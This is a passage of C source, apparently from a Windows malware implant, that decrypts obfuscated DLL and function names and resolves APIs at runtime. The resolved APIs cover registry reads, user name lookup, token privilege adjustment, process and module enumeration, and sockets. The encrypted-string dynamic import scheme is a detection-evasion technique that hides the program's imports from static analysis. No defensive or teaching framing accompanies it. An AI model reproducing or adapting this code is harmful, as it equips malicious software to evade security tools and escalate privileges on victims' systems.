		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, closesocket_STRING, closesocket_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}


//
FARPROC get_function_pointer_advapi32_dll(int function_index)
{
	//
	char* decrypted_advapi32_dll_string = NULL;

	decrypt_to_string(&decrypted_advapi32_dll_string, ADVAPI32_DLL_STRING, ADVAPI32_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_advapi32_dll() - decrypted_advapi32_dll_string: %s\n", decrypted_advapi32_dll_string);

	//
	l_LoadLibraryA(decrypted_advapi32_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_advapi32_dll_string);


	//
	free(decrypted_advapi32_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_advapi32_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		//l_RegOpenKeyExA()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_advapi32_dll", handle, RegOpenKeyExA_STRING, RegOpenKeyExA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_RegGetValueA()
	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_advapi32_dll", handle, RegGetValueA_STRING, RegGetValueA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_GetUserNameA()
	case 3:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_advapi32_dll", handle, GetUserNameA_STRING, GetUserNameA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_OpenProcessToken()
	case 4:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_advapi32_dll", handle, OpenProcessToken_STRING, OpenProcessToken_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_LookupPrivilegeValueA()
	case 5:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_advapi32_dll", handle, LookupPrivilegeValueA_STRING, LookupPrivilegeValueA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_AdjustTokenPrivileges()
	case 6:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_advapi32_dll", handle, AdjustTokenPrivileges_STRING, AdjustTokenPrivileges_STRING_LEN);
		return function_pointer;
	}
	break;



	//
	default:
		return NULL;
		break;

	}

}

//
FARPROC get_function_pointer_psapi_dll(int function_index)
{
	//
	char* decrypted_psapi_dll_string = NULL;

	decrypt_to_string(&decrypted_psapi_dll_string, PSAPI_DLL_STRING, PSAPI_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_psapi_dll() - decrypted_psapi_dll_string: %s\n", decrypted_psapi_dll_string);

	//
	l_LoadLibraryA(decrypted_psapi_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_psapi_dll_string);


	//
	free(decrypted_psapi_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_psapi_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_psapi_dll", handle, EnumProcesses_STRING, EnumProcesses_STRING_LEN);
		return function_pointer;
	}
	break;

	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_psapi_dll", handle, EnumProcessModules_STRING, EnumProcessModules_STRING_LEN);
		return function_pointer;
	}
	break;

	case 3:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_psapi_dll", handle, GetModuleFileNameExA_STRING, GetModuleFileNameExA_STRING_LEN);
		return function_pointer;
	}
	break;

	case 4:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_psapi_dll", handle, GetModuleBaseNameA_STRING, GetModuleBaseNameA_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}